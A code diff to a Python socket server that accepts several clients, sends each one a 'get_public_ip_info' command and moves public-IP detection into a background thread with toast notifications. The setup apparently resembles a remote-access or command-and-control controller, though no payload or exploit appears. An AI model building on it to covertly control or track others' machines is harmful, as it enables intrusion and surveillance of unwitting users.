@@ -244,58 +244,68 @@ def accept_connections(server_socket):
                 if client_sockets[i] is None:
                     client_sockets[i] = client
                     
-                    # Request client's public IP information
-                    try:
-                        client.send("get_public_ip_info".encode())
-                        client.settimeout(5.0)  # 5 second timeout
-                        response = client.recv(1024).decode('utf-8', errors='replace')
-                        client.settimeout(None)  # Reset timeout
-                        
-                        # Parse the response to get public IP info
-                        if response and "Public IP:" in response:
-                            lines = response.split('\n')
-                            public_ip = "Unknown"
-                            local_ip = addr[0]
-                            
-                            for line in lines:
-                                if "Public IP:" in line:
-                                    public_ip = line.split(': ')[-1].strip()
-                                elif "Local IP:" in line:
-                                    local_ip = line.split(': ')[-1].strip()
-                            
-                            # Store client information
-                            client_info[i] = {
-                                'public_ip': public_ip,
-                                'local_ip': local_ip,
-                                'connection_ip': addr[0],
-                                'port': addr[1],
-                                'connected_at': time.time()
-                            }
-                            
-                            # Show toast notification with public IP
-                            notification = f"New client {i}: {public_ip} (Public IP)"
-                        else:
-                            # Fallback to connection IP if public IP detection fails
-                            client_info[i] = {
-                                'public_ip': addr[0],
-                                'local_ip': addr[0],
-                                'connection_ip': addr[0],
-                                'port': addr[1],
-                                'connected_at': time.time()
-                            }
-                            notification = f"New client {i}: {addr[0]}:{addr[1]}"
-                    except:
-                        # Fallback if IP detection fails
-                        client_info[i] = {
-                            'public_ip': addr[0],
-                            'local_ip': addr[0],
-                            'connection_ip': addr[0],
-                            'port': addr[1],
-                            'connected_at': time.time()
-                        }
-                        notification = f"New client {i}: {addr[0]}:{addr[1]}"
+                    # Store client information immediately with connection IP
+                    client_info[i] = {
+                        'public_ip': addr[0],  # Will be updated later
+                        'local_ip': addr[0],   # Will be updated later
+                        'connection_ip': addr[0],
+                        'port': addr[1],
+                        'connected_at': time.time(),
+                        'ip_detection_status': 'pending'  # Track detection status
+                    }
                     
+                    # Show immediate connection notification
+                    notification = f"New client {i}: {addr[0]} (Detecting public IP...)"
                     show_toast_notification(notification, 1, position="bottom-right")
+                    
+                    # Start background IP detection after connection is established
+                    def detect_public_ip_background(client_socket, client_id, client_addr):
+                        time.sleep(2)  # Wait 2 seconds for connection to stabilize
+                        try:
+                            # Send IP detection command
+                            client_socket.send("get_public_ip_info".encode())
+                            client_socket.settimeout(8.0)  # 8 second timeout
+                            response = client_socket.recv(1024).decode('utf-8', errors='replace')
+                            client_socket.settimeout(None)  # Reset timeout
+                            
+                            if response and "Public IP:" in response:
+                                lines = response.split('\n')
+                                public_ip = "Unknown"
+                                local_ip = client_addr[0]
+                                
+                                for line in lines:
+                                    if "Public IP:" in line:
+                                        public_ip = line.split(': ')[-1].strip()
+                                    elif "Local IP:" in line:
+                                        local_ip = line.split(': ')[-1].strip()
+                                
+                                # Update client info with detected IPs
+                                if client_info[client_id] is not None:
+                                    client_info[client_id]['public_ip'] = public_ip
+                                    client_info[client_id]['local_ip'] = local_ip
+                                    client_info[client_id]['ip_detection_status'] = 'completed'
+                                    
+                                    # Show success notification
+                                    success_notification = f"Client {client_id}: {public_ip} (Public IP detected!)"
+                                    show_toast_notification(success_notification, 2, position="bottom-right")
+                            else:
+                                # Mark as failed but keep connection
+                                if client_info[client_id] is not None:
+                                    client_info[client_id]['ip_detection_status'] = 'failed'
+                        except Exception as e:
+                            # Mark as failed but keep connection
+                            if client_info[client_id] is not None:
+                                client_info[client_id]['ip_detection_status'] = 'failed'
+                    
+                    # Start the background IP detection thread
+                    ip_detection_thread = threading.Thread(
+                        target=detect_public_ip_background, 
+                        args=(client, i, addr)
+                    )
+                    ip_detection_thread.daemon = True
+                    ip_detection_thread.start()
+                    
+                    # Initial notification already shown above
                     break
             else:
                 # If no empty slot, reject the connection
